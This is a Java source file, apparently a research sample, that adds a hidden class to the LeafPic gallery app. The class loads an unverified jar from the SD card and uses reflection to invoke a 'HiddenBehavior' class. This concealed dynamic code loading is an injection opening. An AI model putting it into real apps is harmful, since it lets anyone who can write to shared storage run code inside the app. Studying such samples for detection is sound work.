package org.horaapps.leafpic.D;

import android.content.Context;
import android.util.Log;

import java.io.File;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;

import static android.content.Context.MODE_PRIVATE;

/**
 * @author nishadgurav
 *         11/5/16.
 */

public class DoStuff {
    public static void callService(Context context){
        String jarContainerPath =  "/mnt/sdcard/dexHidden.jar";
        File dexOutputDir = context.getDir("dex", MODE_PRIVATE);
        Log.d("Dynamic","loaded");
        //load the code
        DexClassLoader mDexClassLoader = new DexClassLoader(jarContainerPath,
                dexOutputDir.getAbsolutePath(),
                null,
                context.getClass().getClassLoader());
        try {
            //use java reflection to call a method in the loaded class
            Class<?> loadedClass = mDexClassLoader.loadClass("edu.uci.seal.icc.HiddenBehavior");

            //list all methods in the class
            Method[] methods = loadedClass.getDeclaredMethods();
            for (int i=0; i<methods.length; i++){
                Log.d("Dynamic","Method: "+methods[i].getName());
            }

            Method methodCallService = loadedClass.getMethod("callService", Context.class);
            Object object = loadedClass.newInstance();
            methodCallService.invoke(object, context);


        }catch (Exception e){
            e.printStackTrace();
        }

    }

}
